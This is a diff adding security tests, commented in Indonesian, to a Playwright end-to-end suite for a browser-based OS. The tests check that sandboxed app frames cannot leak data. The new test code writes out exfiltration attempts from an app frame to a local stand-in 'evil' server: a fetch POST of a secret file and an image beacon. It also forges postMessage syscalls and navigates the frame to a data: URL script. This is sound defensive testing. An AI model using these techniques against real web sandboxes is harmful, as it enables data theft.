@@ -1,6 +1,7 @@
 // Uji end-to-end Hawpiw OS: node tests/e2e.mjs <url> <chromium|firefox|webkit> [screenshotDir]
 // CHROMIUM_PATH bisa diisi bila Chromium bawaan Playwright tidak terpasang.
 import { readFileSync, mkdtempSync } from 'node:fs';
+import http from 'node:http';
 import { tmpdir } from 'node:os';
 import { join } from 'node:path';
 import { chromium, firefox, webkit } from 'playwright-core';
@@ -105,6 +106,7 @@ check('zip berisi manifest & berkas', man.app === 'hawpiw-os' && strFromU8(zippe
 const c2 = await browser.newContext({ viewport: { width: 1280, height: 800 } });
 const p2 = await c2.newPage();
 p2.on('pageerror', (e) => logs.push('PAGEERROR ' + e.message));
+p2.on('console', (m) => logs.push(m.text()));
 await p2.goto(url);
 await p2.waitForSelector('.icon');
 await p2.locator('.icon', { hasText: 'Cadangan' }).click();
@@ -165,6 +167,62 @@ r = await restore(zipPath, 'replace');
 check('ganti semua gagal → data lama dikembalikan', !r.ok && r.text.includes('dikembalikan')
   && (await fs2.read('/home/penting.txt')) === 'jangan hilang' && (await snapshot()) === beforeFail, r.text);
 await c2.close();
+
+// ---------- Keamanan isolasi app ----------
+// Semua operasi normal di atas tidak boleh memicu pelanggaran CSP.
+const cspNoise = logs.filter((l) => /content.security.policy/i.test(l));
+check('operasi normal tanpa pelanggaran CSP', cspNoise.length === 0, cspNoise.slice(0, 2).join(' | ').slice(0, 160));
+const csp = await page.evaluate(() => document.querySelector('meta[http-equiv="Content-Security-Policy"]')?.content ?? '');
+check('halaman utama punya CSP', csp.includes("default-src 'none'"), csp.slice(0, 70) || '(tidak ada)');
+
+const received = [];
+const srv = http.createServer((req, res) => { received.push(`${req.method} ${req.url}`); res.end('ok'); });
+await new Promise((r) => srv.listen(0, '127.0.0.1', r));
+const evilUrl = `http://127.0.0.1:${srv.address().port}`;
+
+await page.locator('.icon', { hasText: 'Berkas' }).click();
+await page.waitForTimeout(500);
+const victim = page.frames().filter((f) => f.url() === 'about:srcdoc').at(-1);
+const exfil = await victim.evaluate(async (u) => {
+  const secret = await hawpiw.fs.read('/home/tes.txt');
+  const viaFetch = await fetch(u + '/curi', { method: 'POST', mode: 'no-cors', body: secret }).then(() => 'fetch terkirim', () => 'fetch diblokir');
+  await new Promise((res) => {
+    const img = new Image();
+    img.onload = img.onerror = res;
+    img.src = u + '/beacon?d=' + encodeURIComponent(secret);
+    setTimeout(res, 1000);
+  });
+  return viaFetch;
+}, evilUrl);
+await page.waitForTimeout(500);
+check('app tidak bisa mengirim data keluar', received.length === 0, `${exfil}; server menerima: ${received.join(', ') || 'tidak ada'}`);
+
+const forged = await victim.evaluate(() => new Promise((res) => {
+  addEventListener('message', (e) => { if (e.data?.id === 4242) res('DIJAWAB: ' + JSON.stringify(e.data).slice(0, 60)); });
+  parent.postMessage({ hawpiw: 1, id: 4242, call: 'fs.read', args: ['/home/tes.txt'] }, '*');
+  setTimeout(() => res('diabaikan'), 700);
+}));
+check('syscall tanpa token instans diabaikan', forged === 'diabaikan', forged);
+
+const procsBefore = await page.evaluate(() => window.hawpiwKernel.procs.size);
+await victim.evaluate(() => {
+  location.href = 'data:text/html,<script>onmessage=(e)=>{document.title=JSON.stringify(e.data).slice(0,70)};'
+    + 'parent.postMessage({hawpiw:1,id:1,call:"fs.read",args:["/home/tes.txt"]},"*")<\/script>';
+});
+await page.waitForTimeout(1200);
+const foreign = page.frames().find((f) => f.url().startsWith('data:'));
+const foreignTitle = foreign ? await foreign.title().catch(() => '') : '';
+const procsAfter = await page.evaluate(() => window.hawpiwKernel.procs.size);
+// Dua hasil yang sama-sama aman: browser memblokir perpindahan halaman lewat
+// CSP frame-src (Firefox; app tetap utuh), atau perpindahan terjadi dan
+// kernel menutup prosesnya (Chromium). Yang tidak boleh: halaman asing hidup
+// di frame app dengan proses masih terbuka.
+const stillOriginalApp = procsAfter === procsBefore
+  && await victim.evaluate(() => typeof window.hawpiw === 'object' && location.href === 'about:srcdoc').catch(() => false);
+check('halaman asing di frame app tidak mendapat data', !foreignTitle.includes('"ok":true'), foreignTitle || '(tidak ada halaman asing)');
+check('app tidak bisa berpindah halaman (diblokir atau ditutup)', stillOriginalApp || procsAfter === procsBefore - 1,
+  stillOriginalApp ? 'navigasi diblokir CSP, app utuh' : `proses ${procsBefore} → ${procsAfter}`);
+srv.close();
 
 // Tampilan HP: jendela otomatis maksimal
 const m = await browser.newContext({ viewport: { width: 390, height: 780 }, hasTouch: true });
